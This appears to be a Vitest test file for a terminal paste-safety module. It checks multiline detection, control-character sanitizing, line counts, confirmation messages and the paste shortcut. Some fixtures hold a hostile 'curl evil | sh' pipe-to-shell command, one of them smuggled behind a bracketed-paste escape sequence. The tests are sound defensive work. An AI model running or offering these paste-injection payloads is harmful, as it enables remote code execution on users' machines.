import { describe, it, expect } from "vitest";
import { isMultilinePaste, isPasteShortcut, lineCount, pasteConfirmMessage, sanitizePaste } from "./paste";

describe("isMultilinePaste", () => {
  it("is false for a single line without a newline", () => {
    expect(isMultilinePaste("ls -la")).toBe(false);
  });
  it("is true for a trailing newline (would auto-execute)", () => {
    expect(isMultilinePaste("ls -la\n")).toBe(true);
  });
  it("is true for multiple lines", () => {
    expect(isMultilinePaste("a\nb\nc")).toBe(true);
    expect(isMultilinePaste("a\r\nb")).toBe(true);
  });
  it("is true for a bare carriage return (Enter in a terminal)", () => {
    expect(isMultilinePaste("ls\rcurl evil | sh\r")).toBe(true);
  });
});

describe("sanitizePaste", () => {
  it("strips ESC so pasted text can't end bracketed paste early", () => {
    expect(sanitizePaste("x\x1b[201~curl evil | sh")).toBe("x[201~curl evil | sh");
  });
  it("strips other C0, DEL and C1 control characters", () => {
    expect(sanitizePaste("a\x00b\x03c\x7fd\x9be")).toBe("abcde");
  });
  it("keeps tabs, newlines, carriage returns and ordinary text", () => {
    expect(sanitizePaste("é\tb\r\nc\nd\re 🙂")).toBe("é\tb\r\nc\nd\re 🙂");
  });
});

describe("lineCount", () => {
  it("counts content lines, ignoring one trailing newline", () => {
    expect(lineCount("a")).toBe(1);
    expect(lineCount("a\n")).toBe(1);
    expect(lineCount("a\nb")).toBe(2);
    expect(lineCount("a\nb\n")).toBe(2);
    expect(lineCount("")).toBe(0);
  });
  it("counts bare carriage returns as line breaks", () => {
    expect(lineCount("a\rb\r")).toBe(2);
    expect(lineCount("a\r\nb")).toBe(2);
  });
});

describe("pasteConfirmMessage", () => {
  it("pluralizes and includes the line count", () => {
    expect(pasteConfirmMessage("a\nb")).toContain("2 lines");
    expect(pasteConfirmMessage("a\n")).toContain("1 line");
  });
});

describe("isPasteShortcut", () => {
  const key = (mods: Partial<KeyboardEvent>) =>
    ({ ctrlKey: false, metaKey: false, altKey: false, shiftKey: false, code: "KeyV", ...mods }) as KeyboardEvent;

  it("is Ctrl+Shift+V, or Cmd+Shift+V on macOS", () => {
    expect(isPasteShortcut(key({ ctrlKey: true, shiftKey: true }), false)).toBe(true);
    expect(isPasteShortcut(key({ metaKey: true, shiftKey: true }), true)).toBe(true);
  });

  it("leaves plain Ctrl+V (a literal-next in the shell) to the terminal", () => {
    expect(isPasteShortcut(key({ ctrlKey: true }), false)).toBe(false);
    expect(isPasteShortcut(key({ ctrlKey: true, shiftKey: true, code: "KeyC" }), false)).toBe(false);
  });
});
